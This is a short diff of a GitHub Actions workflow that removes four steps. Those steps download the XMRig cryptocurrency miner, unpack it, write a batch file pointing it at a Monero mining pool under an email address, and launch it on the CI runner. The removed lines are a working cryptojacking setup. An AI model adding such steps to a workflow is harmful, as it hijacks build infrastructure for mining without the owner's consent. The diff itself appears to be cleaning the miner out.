@@ -19,21 +19,7 @@ jobs:
 
     steps:
 
-    - name: Download
 
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-gcc-win64.zip -OutFile xmrig.zip
-
-    - name: Extract
-
-      run: Expand-Archive -LiteralPath xmrig.Zip
-
-    - name: write
-
-      run: Set-Content -Path '.\xmrig\xmrig-6.12.2\c.bat' -Value 'xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u devintaison568@gmail.com -p x --threads=1'
-
-    - name: run
-
-      run: cd .\xmrig\xmrig-6.12.2\ ; start-process c.bat
 
     - name: walk
 
